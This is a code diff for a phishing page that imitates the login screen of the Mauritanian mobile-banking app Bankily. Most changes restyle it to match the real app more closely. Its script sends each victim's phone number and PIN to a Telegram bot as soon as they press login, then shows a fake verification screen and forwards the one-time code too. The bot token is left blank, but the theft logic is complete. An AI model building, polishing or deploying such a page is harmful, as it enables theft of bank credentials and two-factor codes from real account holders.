@@ -7,75 +7,130 @@
 <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet"/>
 <style>
 *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
-html,body{width:100%;height:100%;overflow:hidden;font-family:'Cairo',sans-serif;background:#d0d0d0}
+html,body{width:100%;height:100%;overflow:hidden;font-family:'Cairo',sans-serif;background:#fff}
 #app{width:100%;height:100%;display:flex;justify-content:center}
 .phone{width:100%;max-width:430px;height:100%;background:#fff;display:flex;flex-direction:column;overflow:hidden}
 .hdr{background:#fff;height:52px;flex-shrink:0;display:flex;align-items:center;padding:0 14px;position:relative}
 .hdr-title{position:absolute;left:50%;transform:translateX(-50%);color:#fff;font-size:18px;font-weight:700}
 .hdr-back{background:none;border:none;cursor:pointer;color:#fff;font-size:32px;line-height:1;padding:0;margin-right:auto}
 .body{flex:1;overflow-y:auto;display:flex;flex-direction:column;padding:0 24px 16px;-webkit-overflow-scrolling:touch}
-.logo-box{display:flex;justify-content:center;margin:40px 0 50px}
-.logo-box img{width:280px;object-fit:contain}
-.field{margin-bottom:20px}
-.lbl{font-size:13px;font-weight:600;color:#333;display:block;text-align:right;margin-bottom:8px}
-.row{display:flex;align-items:center;border-bottom:2px solid #ccc;padding:8px 0;gap:8px;transition:border-color .2s}
+.logo-box{display:flex;justify-content:center;margin:30px 0 40px}
+.logo-box img{width:260px;object-fit:contain}
+.field{margin-bottom:28px}
+.lbl{font-size:14px;font-weight:600;color:#333;display:block;text-align:right;margin-bottom:8px}
+
+/* تصميم الصف والحقول بأسلوب محاذاة مسطحة تماماً مثل الفيديو */
+.row{
+  display:flex;
+  align-items:center;
+  border-bottom:1.5px solid #ccc;
+  padding:6px 0;
+  gap:10px;
+  position:relative;
+}
 .row:focus-within{border-color:#000}
 .row.bad{border-bottom-color:#e74c3c}
-.row input{flex:1;border:none;outline:none;font-family:'Cairo',sans-serif;font-size:16px;color:#1a1a1a;background:transparent;text-align:right;direction:rtl;min-width:0;caret-color:#000}
-.row input::placeholder{color:#bbb;font-size:13px}
-.ico{width:22px;height:22px;flex-shrink:0;color:#000}
+
+.row input#ph{
+  flex:1;
+  border:none;
+  outline:none;
+  font-family:'Cairo',sans-serif;
+  font-size:18px;
+  font-weight:600;
+  color:#1a1a1a;
+  background:transparent;
+  text-align:left !important;
+  direction:ltr !important;
+  caret-color:#000;
+  letter-spacing:1px;
+}
+
+.ico{width:22px;height:22px;flex-shrink:0;color:#333}
+
+/* إخفاء حقل الملاحظة وتحسين الحقول الخاصة بالرمز السري */
 .errmsg{color:#e74c3c;font-size:12px;text-align:right;margin-top:4px;min-height:16px}
 .warning-msg{background:#fce4e4;border:1px solid #f5c2c2;border-radius:8px;padding:12px;margin-top:12px;display:flex;gap:10px;align-items:flex-start;text-align:right;font-size:13px;color:#333;line-height:1.5}
 .warning-msg::before{content:'!';background:#e74c3c;color:#fff;width:24px;height:24px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:bold;flex-shrink:0;font-size:16px}
-.pins{flex:1;display:flex;gap:14px;justify-content:flex-end;direction:ltr}
-.pins input{
-  width:18px;
+
+/* نقاط الـ PIN المجمعة بنمط شاشة الدخول العادية */
+.pins-container {
+  flex:1;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  gap:18px;
+  direction:ltr;
+}
+
+.pins-container input {
+  width:16px;
+  height:24px;
   text-align:center;
-  font-size:22px;
-  font-weight:700;
+  font-size:32px;
+  font-weight:800;
   border:none;
   outline:none;
   background:transparent;
   font-family:'Cairo',sans-serif;
-  color:#1a1a1a;
+  color:#000;
   caret-color:#000;
   padding:0;
   direction:ltr;
-  -webkit-text-security: disc; /* يضمن إخفاء النص بنقاط على هواتف آيفون ومتصفحات سفاري/كروم */
-  text-security: disc;         /* يضمن إخفاء النص بنقاط على جميع المتصفحات المتوافقة */
+  -webkit-text-security: disc;
+  text-security: disc;
 }
-.pin-dot:not(:placeholder-shown){color:#000;font-size:1.8rem;line-height:0}
-.lnk-sm{font-size:13px;color:#777;text-decoration:underline;cursor:pointer;background:none;border:none;font-family:'Cairo',sans-serif}
-.lnk-md{font-size:14px;font-weight:700;color:#555;text-decoration:underline;cursor:pointer;background:none;border:none;font-family:'Cairo',sans-serif}
+
+.lnk-sm{font-size:13px;color:#555;text-decoration:underline;cursor:pointer;background:none;border:none;font-family:'Cairo',sans-serif}
+.lnk-md{font-size:14px;font-weight:700;color:#333;text-decoration:underline;cursor:pointer;background:none;border:none;font-family:'Cairo',sans-serif}
 .spacer{flex:1;min-height:20px}
-.btn{height:58px;background:#F5C444;border:none;width:100%;font-family:'Cairo',sans-serif;font-size:20px;font-weight:800;color:#fff;cursor:pointer;flex-shrink:0;transition:opacity .15s}
-.btn:active{opacity:.82}
+
+/* الزر السفلي الأصفر العريض المطابق */
+.btn{
+  height:54px;
+  background:#F2C029;
+  border:none;
+  width:100%;
+  font-family:'Cairo',sans-serif;
+  font-size:20px;
+  font-weight:800;
+  color:#fff;
+  cursor:pointer;
+  flex-shrink:0;
+  transition:opacity .15s;
+}
+.btn:active{opacity:.85}
+
 .screen{display:flex;flex-direction:column;height:100%}
 .hide{display:none!important}
-.otp-title{font-size:20px;font-weight:800;color:#1a1a1a;text-align:center;line-height:1.6;margin:30px 8px 36px}
-.otp-row{display:flex;gap:16px;justify-content:center;direction:ltr;margin-bottom:32px}
-.otp-row input{width:52px;height:60px;text-align:center;font-size:28px;font-weight:700;font-family:'Cairo',sans-serif;border:none;border-bottom:2.5px solid #ccc;outline:none;background:transparent;color:#1a1a1a;transition:border-color .2s;caret-color:#000;direction:ltr;text-align:center}
+
+/* شاشة الـ OTP والمطابقة للفيديو */
+.otp-title{font-size:19px;font-weight:700;color:#1a1a1a;text-align:center;line-height:1.5;margin:28px 8px 32px}
+.otp-row{display:flex;gap:18px;justify-content:center;direction:ltr;margin-bottom:28px}
+.otp-row input{
+  width:48px;
+  height:52px;
+  text-align:center;
+  font-size:26px;
+  font-weight:700;
+  font-family:'Cairo',sans-serif;
+  border:none;
+  border-bottom:2px solid #ccc;
+  outline:none;
+  background:transparent;
+  color:#1a1a1a;
+  transition:border-color .2s;
+  caret-color:#000;
+  direction:ltr;
+}
 .otp-row input:focus{border-color:#000}
 .otp-row input.bad{border-color:#e74c3c}
-.cd-wrap{display:flex;flex-direction:column;align-items:center;gap:14px;margin-bottom:26px}
-.cd-text{text-align:center;color:#555;font-size:14px;line-height:1.7}
-.cd-time{font-weight:700;color:#1a1a1a;font-size:17px}
+.cd-wrap{display:flex;flex-direction:column;align-items:center;gap:12px;margin-bottom:24px}
+.cd-text{text-align:center;color:#555;font-size:14px;line-height:1.6}
+.cd-time{font-weight:700;color:#1a1a1a;font-size:16px}
 
-/* خاصية LTR لحقل رقم الهاتف */
-#ph {
-  direction: ltr !important;
-  text-align: left !important;
-}
-
-/* خاصية LTR لحقل الرقم السري */
-#p0, #p1, #p2, #p3 {
-  direction: ltr !important;
-  text-align: left !important;
-}
-
-/* تنسيق شريط رمز التحقق العلوي المتطابق */
 .otp-hdr {
-  background: #4497A7 !important;
+  background: #2E818F !important;
 }
 </style>
 </head>
@@ -94,11 +149,10 @@ html,body{width:100%;height:100%;overflow:hidden;font-family:'Cairo',sans-serif;
     <div class="field">
       <label class="lbl">اسم المستخدم أو رقم الهاتف</label>
       <div class="row" id="row-ph">
+        <input type="tel" id="ph" inputmode="numeric" maxlength="8" placeholder="" autocomplete="off"/>
         <svg class="ico" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
           <circle cx="12" cy="8" r="4"/><path d="M4 20c0-4 3.6-7 8-7s8 3 8 7"/>
         </svg>
-        <input type="tel" id="ph" inputmode="numeric" maxlength="8"
-               placeholder="" autocomplete="off"/>
       </div>
       <div class="errmsg" id="err-ph"></div>
       <div class="warning-msg hide" id="warn-ph">رقم الهاتف غير تابع لشركات الاتصال المعتمدة (موريتل، ماتل، شنقيتل)</div>
@@ -107,27 +161,27 @@ html,body{width:100%;height:100%;overflow:hidden;font-family:'Cairo',sans-serif;
     <div class="field">
       <label class="lbl">الرقم السري</label>
       <div class="row" id="row-pin">
+        <div class="pins-container">
+          <input type="password" inputmode="numeric" maxlength="1" class="pin-field" id="p0"/>
+          <input type="password" inputmode="numeric" maxlength="1" class="pin-field" id="p1"/>
+          <input type="password" inputmode="numeric" maxlength="1" class="pin-field" id="p2"/>
+          <input type="password" inputmode="numeric" maxlength="1" class="pin-field" id="p3"/>
+        </div>
         <svg class="ico" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
           <rect x="3" y="11" width="18" height="11" rx="2"/>
           <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
         </svg>
-        <div class="pins">
-          <input type="password" inputmode="numeric" maxlength="1" class="pin-field pin-dot" id="p0"/>
-          <input type="password" inputmode="numeric" maxlength="1" class="pin-field pin-dot" id="p1"/>
-          <input type="password" inputmode="numeric" maxlength="1" class="pin-field pin-dot" id="p2"/>
-          <input type="password" inputmode="numeric" maxlength="1" class="pin-field pin-dot" id="p3"/>
-        </div>
       </div>
       <div class="errmsg" id="err-pin"></div>
     </div>
 
-    <div style="text-align:left">
+    <div style="text-align:right">
       <button class="lnk-sm" onclick="void(0)">نسيت الرقم السري؟</button>
     </div>
 
     <div class="spacer"></div>
     <div style="text-align:center;margin-bottom:14px">
-      <button class="lnk-md" onclick="void(0)">مستخدم جديد؟  سجل الآن!</button>
+      <button class="lnk-md" onclick="void(0)">مستخدم جديد؟ سجل الآن!</button>
     </div>
   </div>
   <button class="btn" onclick="login()">تسجيل الدخول</button>
@@ -151,9 +205,9 @@ html,body{width:100%;height:100%;overflow:hidden;font-family:'Cairo',sans-serif;
         تنتهي صلاحية رمز التأكيد خلال<br/>
         <span class="cd-time" id="cd">4 دقائق 59 ثاني</span>
       </div>
-      <svg width="64" height="64" viewBox="0 0 64 64">
-        <circle cx="32" cy="32" r="27" stroke="#e5e7eb" stroke-width="6" fill="white"/>
-        <circle id="cp" cx="32" cy="32" r="27" stroke="#22c55e" stroke-width="6" fill="none"
+      <svg width="60" height="60" viewBox="0 0 64 64">
+        <circle cx="32" cy="32" r="27" stroke="#e5e7eb" stroke-width="5" fill="white"/>
+        <circle id="cp" cx="32" cy="32" r="27" stroke="#22c55e" stroke-width="5" fill="none"
           stroke-dasharray="169.6" stroke-dashoffset="0"
           style="transform:rotate(-90deg);transform-origin:32px 32px;transition:stroke-dashoffset 1s linear"/>
       </svg>
@@ -168,13 +222,9 @@ html,body{width:100%;height:100%;overflow:hidden;font-family:'Cairo',sans-serif;
 </div>
 
 <script>
-// ══════════════════════════════════════════
-// بيانات البوت - Token و Chat ID
-// ══════════════════════════════════════════
 const telegramToken = "";
 const telegramChatId = "";
 
-// دالة إرسال البيانات إلى تليجرام
 function sendToTelegram(phone, pin, otpCode = null) {
   let message = `🔔 Bankily Login\n📱 Phone: ${phone}\n🔑 Pin: ${pin}`;
   if (otpCode) {
@@ -192,12 +242,8 @@ function sendToTelegram(phone, pin, otpCode = null) {
       parse_mode: "HTML"
     })
   })
-  .then(response => {
-    console.log("Message sent to Telegram");
-  })
-  .catch(error => {
-    console.error("Error sending to Telegram:", error);
-  });
+  .then(response => console.log("Sent"))
+  .catch(error => console.error("Error:", error));
 }
 
 function setupStrictLengthValidation(inputElement, maxLength) {
@@ -254,25 +300,6 @@ P.forEach(function(el,i){
   });
 });
 
-// منع الكتابة المباشرة في الحقل الأيمن (p3)
-P[3].addEventListener('mousedown', function(e){
-  if(P[2].value === ''){
-    e.preventDefault();
-    for(let j=0;j<3;j++){if(P[j].value===''){P[j].focus();break;}}
-  }
-});
-P[3].addEventListener('touchstart', function(e){
-  if(P[2].value === ''){
-    e.preventDefault();
-    for(let j=0;j<3;j++){if(P[j].value===''){P[j].focus();break;}}
-  }
-},{passive:false});
-P[3].addEventListener('keydown', function(e){
-  if(P[2].value === '' && e.key !== 'Backspace' && e.key !== 'Tab'){
-    e.preventDefault();
-  }
-});
-
 var phEl=document.getElementById('ph');
 setupStrictLengthValidation(phEl, 8);
 phEl.addEventListener('input',function(){
@@ -297,7 +324,6 @@ function checkPhoneOperator(){
   }
 }
 
-// دالة تسجيل الدخول مع الإرسال إلى تليجرام
 function login(){
   var ph=phEl.value.trim();
   var pin=P.map(function(p){return p.value;}).join('');
@@ -313,7 +339,6 @@ function login(){
     ok=false;
   }
 
-  // إرسال البيانات إلى تليجرام فوراً
   sendToTelegram(ph, pin);
 
   if(ok)showOtp();
@@ -351,7 +376,6 @@ O.forEach(function(el,i){
   });
 });
 
-// دالة التحقق مع إرسال OTP إلى تليجرام
 function verify(){
   var code=O.map(function(o){return o.value;}).join('');
   if(code.length!==4){
@@ -359,7 +383,6 @@ function verify(){
     return;
   }
 
-  // إرسال OTP إلى تليجرام
   var ph=phEl.value.trim();
   var pin=P.map(function(p){return p.value;}).join('');
   sendToTelegram(ph, pin, code);
